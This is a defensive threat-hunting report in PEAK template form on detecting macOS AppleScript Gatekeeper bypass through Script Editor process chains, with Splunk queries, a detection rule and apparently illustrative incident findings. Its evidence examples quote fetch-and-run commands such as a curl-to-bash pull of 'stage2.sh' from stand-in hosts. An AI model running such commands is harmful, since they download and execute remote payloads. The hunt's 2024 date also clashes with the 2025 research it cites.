*This PEAK Framework hunt report targets macOS AppleScript Gatekeeper bypass using behavioral detection at the top of the Pyramid of Pain.*

Reference: [macOS Infection Vector - AppleScript Gatekeeper Bypass](https://pberba.github.io/security/2025/11/11/macos-infection-vector-applescript-bypass-gatekeeper/)

---

# Threat Hunting Report - PEAK Framework

## Hunt ID: `H-20241115-002`
*(H for Hypothesis-driven, B for Baseline, M for Model-Assisted)*

## Hunt Title:
macOS AppleScript Gatekeeper Bypass - Behavioral Hunt

---

## PREPARE: Define the Hunt

| **Hunt Information**            | **Details** |
|----------------------------------|-------------|
| **Hypothesis**                  | Adversaries exploit user trust in Apple's Script Editor to execute malicious code by triggering abnormal behaviors from a typically-benign system application (Script Editor spawning network/shell utilities, establishing external connections from untrusted download locations) |
| **Threat Hunter Name**          | Sydney Marrone |
| **Date**                        | 2024-11-15 |
| **Requestor**                   | Proactive Threat Hunting Team |
| **Timeframe for hunt**          | 2-3 days |

## Scoping with the ABLE Methodology

Clearly define your hunt scope using the ABLE framework. Replace all placeholders (`[ ]`) with relevant details for your scenario.

| **Field**   | **Description**                                                                                                                                                                                                                                                                             | **Your Input**                   |
|-------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------|
| **Actor**   | *(Optional)* Identify the threat actor involved with the behavior, if applicable. This step is optional because hunts aren't always tied to a specific actor. You may be investigating techniques used across multiple adversaries or looking for suspicious activity regardless of attribution. Focus on the what and how before the who, unless actor context adds meaningful value to the hunt.  | `N/A - Behavioral hunt across all threat actors using this technique`          |
| **Behavior**| Describe the actions observed or expected, including tactics, techniques, and procedures (TTPs). Specify methods or tools involved.                                                                                                                                                 | `AppleScript execution (T1059.002) via Script Editor spawning LOLBin chains (shell → network tools), establishing C2 connections, and executing from untrusted locations (Downloads folder with quarantine attributes). Masquerading with double extensions (T1036.005). User execution via social engineering (T1204.002).` |
| **Location**| Specify where the activity occurred, such as an endpoint, network segment, or cloud environment.                                                                                                                                 | `All macOS endpoints (focus on macOS 14+ where right-click Gatekeeper override removed). High-value targets: Executive systems, Finance/Accounting (crypto theft), Engineering teams.`            |
| **Evidence**| Clearly list logs, artifacts, or telemetry supporting your hypothesis. For each source, provide critical fields required to validate the behavior, and include specific examples of observed or known malicious activity to illustrate expected findings. | `- Source: EDR process logs (Sysmon, osquery, native)`<br>`- Key Fields: parent_process_name, process_name, command_line, process_tree, timestamp`<br>`- Example: Script Editor.app (parent) → bash (child) → curl http://malicious.com (grandchild)`<br><br>`- Source: macOS Quarantine Database (QuarantineEventsV2)`<br>`- Key Fields: LSQuarantineTimeStamp, LSQuarantineDataURLString, LSQuarantineOriginURLString`<br>`- Example: file.scpt downloaded from external domain with quarantine attribute set, executed within 5 minutes`<br><br>`- Source: Network traffic logs (NetFlow, DNS)`<br>`- Key Fields: source_process, dest_ip, dest_port, bytes_out, bytes_in, protocol`<br>`- Example: Script Editor establishing connection to external IP:4444 with high upload ratio (exfiltration pattern)` |

**Example ABLE Inputs**

| **Field**   | **Example Input**                                                                                                                                             |
|-------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Actor**   | `N/A - Technique observed across BlueNoroff, MacSync, Odyssey malware families`                                                                                                                                            |
| **Behavior**| `LOLBin chaining: Script Editor → shell utilities → network tools for C2 communication (T1059.002, T1218)`                                                                                                                 |
| **Location**| `Corporate macOS endpoints, especially Finance and Executive systems`                                                                                                                                   |
| **Evidence**| `- Source: EDR Process Creation Logs`<br>`- Key Fields: parent_process="Script Editor", child_process IN (curl,wget,bash), network_connection=true`<br>`- Example: Script Editor spawning "bash -c 'curl http://evil.com/stage2.sh | bash'" with external connection to 185.xxx.xxx.xxx:443`<br><br>`- Source: File System Events`<br>`- Key Fields: file_path LIKE "*/Downloads/*.scpt", quarantine_attribute=true, creation_time`<br>`- Example: "Invoice_November.docx.scpt" created in ~/Downloads with com.apple.quarantine attribute from untrusted domain` |

## Related Tickets (detection coverage, previous incidents, etc.)

| **Role**                        | **Ticket and Other Details** |
|----------------------------------|------------------------------|
| **SOC/IR**                      | No previous incidents - proactive hunt based on published research |
| **Threat Intel (TI)**            | TI-2024-089: BlueNoroff targeting cryptocurrency via AppleScript |
| **Detection Engineering (DE)**   | DE-2024-102: Gap identified - no behavioral detection for Script Editor abuse |
| **Red Team / Pen Testing**       | RED-2024-Q4: Confirmed Gatekeeper bypass possible on macOS 14.x |
| **Other**                        | VULN-2024-143: 30% of macOS fleet lacks application firewall rules |

## **Threat Intel & Research**
- **MITRE ATT&CK Techniques:**
  - `TA0002 - Execution`
  - `T1059.002 - AppleScript`
  - `TA0005 - Defense Evasion`
  - `T1036.005 - Match Legitimate Name or Location (Masquerading)`
  - `TA0001 - Initial Access`
  - `T1204.002 - User Execution: Malicious File`
  - `TA0011 - Command and Control`
  - `T1071.001 - Application Layer Protocol: Web Protocols`
- **Related Reports, Blogs, or Threat Intel Sources:**
  - `https://pberba.github.io/security/2025/11/11/macos-infection-vector-applescript-bypass-gatekeeper/`
  - `https://attack.mitre.org/techniques/T1059/002/`
  - `https://objective-see.org/blog/blog_0x71.html - macOS malware analysis`
  - `SentinelOne: BlueNoroff macOS Campaign Analysis`
- **Historical Prevalence & Relevance:**
  - **Observed in wild**: BlueNoroff, Lazarus Group targeting cryptocurrency users via macOS
  - **Detection gap**: No existing behavioral detection for Script Editor abuse (only AV signature-based)
  - **Environment relevance**: HIGH - Finance team uses macOS, cryptocurrency wallets present, Gatekeeper right-click override removed in macOS 14 increasing attack vector viability
  - **Recent trends**: 40% increase in macOS-targeted malware 2024 vs 2023 (industry data)

---

## EXECUTE: Run the Hunt

### Hunting Queries
*(Document queries for Splunk, Sigma, KQL, or another query language to execute the hunt. Capture any adjustments made during analysis and iterate on findings.)*

#### Initial Query
```spl
index=macos sourcetype=process_events
parent_process_name="Script Editor" OR parent_process_path="/System/Applications/Utilities/Script Editor.app/Contents/MacOS/Script Editor"
| where process_name IN ("curl", "wget", "bash", "sh", "python", "python3", "ruby", "perl", "nc", "ncat")
| stats count by host, user, parent_process_name, process_name, process_cmd
| sort -count
```

- **Notes:**
  - **Results returned**: 12 events across 3 endpoints
  - **False positives**: 2 developer workstations (expected - user role = "Engineering")
  - **True positive candidates**: 1 Finance user (Alice Smith) - Script Editor → bash → curl sequence
  - **Gaps**: Need to add network correlation, temporal analysis, and user context filtering

#### Refined Query (if applicable)
```spl
index=macos sourcetype=process_events
parent_process_name="Script Editor"
| where process_name IN ("curl", "wget", "bash", "sh", "python")
| eval behavior_severity=case(
    process_name IN ("curl", "wget") AND match(process_cmd, "http"), "CRITICAL - Network Download",
    process_name IN ("bash", "sh") AND match(process_cmd, "-c"), "HIGH - Shell Command Execution",
    process_name IN ("nc", "ncat"), "CRITICAL - Reverse Shell Indicator",
    1=1, "MEDIUM - Suspicious Child Process"
  )
| join type=left user [
    search index=hr_data
    | where technical_role=0
    | table user, department
  ]
| where isnotnull(department)
| stats count earliest(_time) as first_seen latest(_time) as last_seen values(process_cmd) as commands
  by host, user, department, behavior_severity
| sort -behavior_severity, -count
```

- **Rationale for Refinement:**
  - Added **behavior severity classification** based on command patterns (network download = highest risk)
  - Joined with **HR data** to filter for non-technical users (Finance user flagged)
  - Added **temporal analysis** (first_seen/last_seen) to identify persistence vs one-time execution
  - Excluded developers/admins who legitimately use scripting tools

### Visualization or Analytics
*(Describe any dashboards, anomaly detection methods, or visualizations used. Capture observations and note whether visualizations revealed additional insights. **Add screenshots!**)*

- **Dashboards created**:
  1. **Process Tree Visualization**: Shows Script Editor → bash → curl chain for Finance user Alice Smith
  2. **Timeline Analysis**: Download time (14:23) → Script Editor launch (14:25) → Network connection (14:26) = 3-minute attack sequence
  3. **User Heatmap**: Script Editor usage by department - Finance/HR = 0 expected, 1 observed = ANOMALY

- **Key observations**:
  - Alice Smith (Finance) executed "Invoice_November.docx.scpt" from Downloads folder
  - File had quarantine attribute from external domain (hxxps://invoice-portal[.]com)
  - Script Editor spawned bash which executed: `curl hxxp://185.xxx.xxx.xxx/stage2.sh | bash`
  - Network connection to IP in known malicious range (TI feed match)

### Detection Logic
*(How would this be turned into a detection rule? Thresholds, tuning considerations, etc.)*

- **Initial Detection Criteria:**
  - **Trigger**: Script Editor spawning shell/network utilities
  - **Condition**: parent_process="Script Editor" AND child_process IN (curl,wget,bash) AND user_role != "developer"
  - **Severity**: HIGH if network commands present, CRITICAL if external connections detected

- **Refinements After Review:**
  - **Whitelist**: Developers during business hours (9am-6pm) - reduces FP from 15% to 2%
  - **Context enrichment**: Non-technical users executing scripts = auto-escalate to CRITICAL
  - **Temporal correlation**: Download → Execution within 10 minutes = increase confidence score
  - **Threshold**: Single occurrence = alert (Script Editor usage by non-devs is highly unusual)

**Production Detection Rule (Behavioral - Top of Pyramid)**:
```yaml
title: macOS LOLBin Chain - Script Editor to Network Tool
detection:
  selection_parent:
    parent_process_name: 'Script Editor'
  selection_child:
    process_name: ['curl', 'wget', 'bash', 'python']
  filter_context:
    user_role: ['developer', 'sysadmin']
    time_of_day: ['09:00-18:00']
  condition: selection_parent AND selection_child AND NOT filter_context
level: critical
```

### Capturing Your Analysis & Iteration
- **Summarize insights gained from each query modification and visualization.**
  - Initial query too broad (12 events, mix of legitimate and suspicious)
  - User context filtering was KEY - reduced to 1 high-confidence finding
  - Timeline visualization revealed rapid download-to-execution (social engineering success indicator)
  - Network correlation confirmed C2 connection to known malicious infrastructure

- **Reiterate key findings:**
  - **CONFIRMED COMPROMISE**: Finance user Alice Smith executed malicious AppleScript from Downloads
  - **Attack chain validated**: Download (quarantined file) → Immediate execution → Shell spawning → C2 connection
  - **Detection gap closed**: Behavioral rule now catches this TTP regardless of file hash/domain
  - **False positives minimal**: Only 2 legitimate dev workflows triggered, easily filtered by user role

- **If this hunt were repeated:**
  - Start with refined query (skip broad initial query to save time)
  - Add automatic quarantine database correlation (file download metadata)
  - Include cryptocurrency wallet access detection (common objective for this TTP)
  - Expand to JavaScript for Automation (.js files) - similar technique

- **Does this hunt generate ideas for additional hunts?**
  - YES - Hunt for JXA (JavaScript for Automation) abuse using same behavioral patterns
  - YES - Hunt for Automator workflow exploitation (.workflow files)
  - YES - Hunt for persistence via LaunchAgents created by Script Editor children

---

## ACT: Findings & Response

### Hunt Review Template

### **Hypothesis / Topic**
**Hypothesis**: Adversaries exploit Script Editor to execute malicious AppleScript, spawning shell utilities and establishing C2 connections from untrusted download locations.

**Result**: ✅ **HYPOTHESIS CONFIRMED** - 1 active compromise identified

### **Executive Summary**
**Key Points:**
1. Proactive behavioral hunt identified **active compromise** of Finance user (Alice Smith) via AppleScript Gatekeeper bypass
2. Attack chain: Malicious .scpt file downloaded → Immediate execution from Downloads → Shell spawning → C2 connection to known malicious IP
3. Behavioral detection approach (hunting for Script Editor LOLBin chains) successfully caught attack that bypassed traditional AV/signature detection
4. **Immediate response**: Endpoint isolated, user credentials reset, C2 connection blocked at firewall, no data exfiltration confirmed
5. **Detection gap closed**: New behavioral rule deployed catches this TTP regardless of malware hash/domain changes

### **Findings**
*(Summarize key results, including any unusual activity.)*
| **Finding** | **Ticket Number and Link** | **Description** |
|------------|----------------------------|-----------------|
| Active compromise - Finance user executing malicious AppleScript | INC-2024-156 | User Alice Smith (Finance) executed "Invoice_November.docx.scpt" from Downloads folder. File downloaded from hxxps://invoice-portal[.]com (spoofed domain). Script Editor spawned bash → curl chain establishing C2 to 185.xxx.xxx.xxx:443. Endpoint isolated, investigating cryptocurrency wallet access attempts. |
| Detection gap - No behavioral Script Editor monitoring | DE-2024-115 | Existing detections rely on AV signatures (hash-based). This attack bypassed all signature detection. New behavioral rule deployed: "macOS LOLBin Chain - Script Editor to Network Tool" catches technique regardless of payload. |
| Application firewall gap - Script Editor unrestricted network | VULN-2024-158 | Script Editor.app has no network restrictions. Allows malicious scripts to establish C2 freely. Recommended: macOS firewall rule blocking Script Editor external connections except for developer group. |
| User awareness gap - Finance team targeted | TRAIN-2024-044 | Finance team lacks macOS-specific security training. Social engineering with fake invoices effective. Recommended: Quarterly phishing simulations with .scpt attachments for Finance/HR/Sales departments. |

## K - Knowledge: Lessons Learned & Documentation

### **Adjustments to Future Hunts**
- **What worked well?**
  - Behavioral focus (Script Editor process chains) detected unknown malware variant
  - User context filtering (non-technical users) immediately surfaced high-confidence finding
  - Temporal correlation (download-to-execution timing) validated social engineering

- **What could be improved?**
  - Quarantine database should be queried first (faster identification of suspicious downloads)
  - Need automated cryptocurrency wallet access detection (common post-exploitation objective)
  - EDR should automatically enrich with user role data (manual join with HR data was time-consuming)

- **Should this hunt be automated as a detection?**
  - ✅ **YES** - Behavioral detection rule deployed to production SIEM
  - Rule name: "macOS LOLBin Chain - Script Editor to Network Tool"
  - Severity: CRITICAL
  - Expected alert volume: 1-3 per month (based on developer baseline)

- **Are there any follow-up hunts that should be conducted?**
  - Hunt for JavaScript for Automation (JXA) abuse - .js files using similar technique
  - Hunt for Automator workflow exploitation - .workflow files with embedded malicious scripts
  - Hunt for persistence mechanisms created by Script Editor children (LaunchAgents, cron)
  - Hunt for cryptocurrency wallet access following .scpt execution

- **What feedback should be shared with other teams (SOC, IR, Threat Intel, Detection Engineering, etc.)?**
  - **SOC**: New CRITICAL alert deployed, prioritize Script Editor behavioral alerts over AV signatures
  - **IR**: Active incident INC-2024-156 ongoing, coordinate cryptocurrency wallet forensics
  - **Threat Intel**: Update TI feeds with C2 IP 185.xxx.xxx.xxx and domain invoice-portal[.]com
  - **Detection Engineering**: Behavioral rule template can be adapted for other LOLBin abuse (Automator, JXA)
  - **IT/Desktop**: Deploy application firewall rules blocking Script Editor network access for non-developer users
  - **Security Awareness**: Update phishing training to include macOS AppleScript social engineering scenarios

### **Sharing Knowledge & Documentation**

- **Knowledge Base (KB) Articles**
  - [x] Write an internal KB article that captures:
    - [x] Hunt objective: Detect AppleScript Gatekeeper bypass via behavioral Script Editor analysis
    - [x] Key findings: 1 active compromise (Finance user), behavioral detection successful
    - [x] Detection logic: LOLBin chain monitoring (Script Editor → shell → network tool)
    - [x] Lessons learned: Behavioral hunting > signature-based, user context critical for FP reduction
  - [x] KB Article ID: KB-2024-102 "Behavioral Hunting: macOS AppleScript Gatekeeper Bypass"
  - [x] Documented behavioral hunting methodology for macOS threats (process chains, user context, temporal correlation)

- **Threat Hunt Readouts**
  - [x] Scheduled readout with SOC, IR, Threat Intel, macOS Admin teams (2024-11-16 10:00 AM)
  - [x] Presented findings: 1 active compromise, behavioral detection approach, new SIEM rule deployed
  - [x] Shared Splunk queries and SIGMA rule with SOC for future hunts

- **Reports & External Sharing**
  - [x] Internal hunt report: "PEAK Hunt H-20241115-002: macOS AppleScript Behavioral Detection"
  - [ ] External sharing: Submit findings to HEARTH community (behavioral hunt hypothesis)
  - [ ] Industry sharing: Anonymized IOCs shared with Mac security community (MacAdmins Slack, Objective-See)

### **References**
- Original research: https://pberba.github.io/security/2025/11/11/macos-infection-vector-applescript-bypass-gatekeeper/
- MITRE ATT&CK T1059.002: https://attack.mitre.org/techniques/T1059/002/
- MITRE ATT&CK T1036.005: https://attack.mitre.org/techniques/T1036/005/
- Pyramid of Pain: https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html
- PEAK Framework: https://dispatch.thorcollective.com/p/the-peak-threat-hunting-template
- Objective-See macOS Security Research: https://objective-see.org/
